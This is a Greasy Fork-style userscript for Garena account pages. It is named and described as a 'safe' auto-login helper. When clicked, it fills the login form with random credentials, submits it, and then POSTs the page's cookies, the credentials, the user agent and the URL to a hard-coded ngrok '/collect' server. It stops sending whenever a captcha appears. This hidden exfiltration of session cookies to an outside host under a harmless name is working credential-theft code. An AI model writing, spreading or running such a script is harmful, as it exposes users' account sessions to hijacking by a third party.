// ==UserScript==
// @name         Safe Auto Login Then Notify (Random Credentials)
// @namespace    http://tampermonkey.net/
// @version      2.0
// @description  Khi bấm OK: auto-fill với random username/password 16 ký tự + click login, chờ login success, rồi gửi thông báo kèm cookie về server.
// @match        https://account.garena.com/*
// @match        https://*.garena.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/547391/Safe%20Auto%20Login%20Then%20Notify%20%28Random%20Credentials%29.user.js
// @updateURL https://update.greasyfork.org/scripts/547391/Safe%20Auto%20Login%20Then%20Notify%20%28Random%20Credentials%29.meta.js
// ==/UserScript==

(function(){
  'use strict';

  const SERVER_URL = "https://311455877732.ngrok-free.app/collect";

  // Hàm tạo chuỗi random 16 ký tự
  function generateRandomString(length = 16) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  // Debug function để tìm selectors
  function debugSelectors(){
    console.log("=== DEBUG SELECTORS ===");
    console.log("Current URL:", location.href);
    console.log("Page title:", document.title);
    
    // Tìm tất cả input fields
    const allInputs = document.querySelectorAll('input');
    console.log("All inputs found:", allInputs.length);
    allInputs.forEach((input, i) => {
      console.log(`Input ${i}:`, {
        type: input.type,
        placeholder: input.placeholder,
        name: input.name,
        id: input.id,
        className: input.className
      });
    });

    // Tìm tất cả buttons
    const allButtons = document.querySelectorAll('button');
    console.log("All buttons found:", allButtons.length);
    allButtons.forEach((btn, i) => {
      console.log(`Button ${i}:`, {
        text: btn.textContent?.trim(),
        type: btn.type,
        className: btn.className,
        id: btn.id
      });
    });
  }

  // Tìm input fields linh hoạt hơn
  function findLoginElements(){
    // Thử nhiều cách tìm username input
    let userInput = document.querySelector('input[placeholder*="Tài khoản"]') ||
                   document.querySelector('input[placeholder*="Email"]') ||
                   document.querySelector('input[placeholder*="điện thoại"]') ||
                   document.querySelector('input[type="text"]:not([type="password"])');

    // Thử nhiều cách tìm password input  
    let passInput = document.querySelector('input[type="password"]') ||
                   document.querySelector('input[placeholder*="Mật khẩu"]');

    // Thử nhiều cách tìm login button
    let loginBtn = document.querySelector('button[type="submit"]') ||
                  document.querySelector('button.primary') ||
                  Array.from(document.querySelectorAll('button')).find(btn => 
                    btn.textContent.includes('Đăng Nhập') || 
                    btn.textContent.includes('Login') ||
                    btn.textContent.includes('Đăng nhập')
                  );

    return { userInput, passInput, loginBtn };
  }

  // Tạo nút OK nổi
  function createOkButton(){
    // Remove existing button nếu có
    const existingBtn = document.getElementById("safe-auto-ok-btn");
    if(existingBtn) existingBtn.remove();
    
    const btn = document.createElement("button");
    btn.id = "safe-auto-ok-btn";
    btn.innerText = "OK";
    Object.assign(btn.style, {
      position: "fixed",
      bottom: "20px",
      right: "20px",
      zIndex: 999999,
      padding: "10px 16px",
      background: "#2e8b57",
      color: "#fff",
      border: "none",
      borderRadius: "6px",
      cursor: "pointer",
      boxShadow: "0 2px 6px rgba(0,0,0,0.2)",
      fontSize: "14px",
      fontWeight: "bold"
    });
    
    document.body.appendChild(btn);
    console.log("OK button created successfully");
    return btn;
  }

  // Hàm auto-fill và click login
  function autoLogin(){
    const randomUsername = generateRandomString(16);
    const randomPassword = generateRandomString(16);
    
    console.log("Generated credentials:", { username: randomUsername, password: randomPassword });

    const { userInput, passInput, loginBtn } = findLoginElements();

    if(!userInput || !passInput || !loginBtn){
      console.warn("Không tìm thấy form login.");
      debugSelectors();
      return false;
    }

    console.log("Found login elements - filling form...");

    // Fill form với random data
    userInput.value = randomUsername;
    passInput.value = randomPassword;
    
    // Trigger events
    userInput.dispatchEvent(new Event("input", {bubbles: true}));
    userInput.dispatchEvent(new Event("change", {bubbles: true}));
    passInput.dispatchEvent(new Event("input", {bubbles: true}));
    passInput.dispatchEvent(new Event("change", {bubbles: true}));

    // Click login button
    setTimeout(() => {
      loginBtn.click();
      console.log("Login button clicked");
    }, 100);
    
    return { username: randomUsername, password: randomPassword };
  }

  // Kiểm tra login thành công
  function waitForLoginSuccess(timeoutMs = 15000){
    const start = Date.now();
    return new Promise((resolve) => {
      const initialUrl = location.href;
      const interval = setInterval(() => {
        // URL redirect
        if(location.href !== initialUrl && !location.href.includes('/login')){
          clearInterval(interval);
          resolve({ ok: true, reason: "url_changed", url: location.href });
          return;
        }

        // Error message
        const errorMsg = document.querySelector('.error, .alert-error, [class*="error"]');
        if(errorMsg && errorMsg.textContent.trim()){
          clearInterval(interval);
          resolve({ ok: false, reason: "error_message", error: errorMsg.textContent.trim(), url: location.href });
          return;
        }

        // Timeout
        if(Date.now() - start > timeoutMs){
          clearInterval(interval);
          resolve({ ok: false, reason: "timeout", url: location.href });
        }
      }, 500);
    });
  }

  // Gửi thông tin kèm cookie
  function sendNotificationWithCookies(info, credentials){
    fetch(SERVER_URL, {
      method: "POST",
      headers: { 
        "Content-Type": "application/json",
        "ngrok-skip-browser-warning": "true"
      },
      body: JSON.stringify({
        status: info.ok ? "logged_in" : "login_failed",
        reason: info.reason,
        url: info.url,
        time: new Date().toISOString(),
        error: info.error || null,
        credentials: {
          username: credentials?.username || "",
          password: credentials?.password || ""
        },
        cookies: document.cookie,
        user_agent: navigator.userAgent,
        page_title: document.title
      })
    })
    .then(r => {
      if(r.ok) {
        return r.json().then(j => console.log("Server reply:", j)).catch(() => console.log("Server response:", r.status));
      } else {
        console.log("Server error:", r.status);
      }
    })
    .catch(e => console.error("Error sending notification:", e));
  }

  // Kiểm tra captcha
  function hasCaptcha(){
    const pageText = document.body.innerText || "";
    const captchaKeywords = ["captcha", "kéo", "slide", "xác minh", "robot", "verify"];
    return captchaKeywords.some(keyword => pageText.toLowerCase().includes(keyword.toLowerCase()));
  }

  // Main execution
  function init(){
    console.log("Script initialized, waiting for page...");
    
    setTimeout(() => {
      try {
        console.log("Initializing after 2 second delay...");
        debugSelectors();
        
        const okBtn = createOkButton();

        // Add click event
        okBtn.onclick = async function() {
          try {
            console.log("OK button clicked!");
            console.log("Button clicked! Starting login process...");
            
            // Auto login
            const credentials = autoLogin();
            if(!credentials){
              console.log("Không tìm thấy form login. Check console.");
              return;
            }

            console.log("Login attempted! Waiting for result...");

            // Chờ kết quả
            const result = await waitForLoginSuccess(15000);
            console.log("Login result:", result);

            // Check captcha
            if(hasCaptcha()){
              console.log("Phát hiện captcha - dừng gửi thông báo.");
              return;
            }

            // Gửi notification
            sendNotificationWithCookies(result, credentials);
            
            const statusMsg = result.ok ? "thành công" : "thất bại";
            console.log(`Hoàn tất: Login ${statusMsg}. Đã gửi cookie về server.`);
            
          } catch(error) {
            console.error("Click handler error:", error);
            console.log("Lỗi: " + error.message);
          }
        };
        
        console.log("Button setup complete!");
        
      } catch(initError) {
        console.error("Init error:", initError);
      }
    }, 2000);
  }

  // Khởi chạy
  if(document.readyState === 'loading'){
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
  
  setTimeout(init, 3000);

})();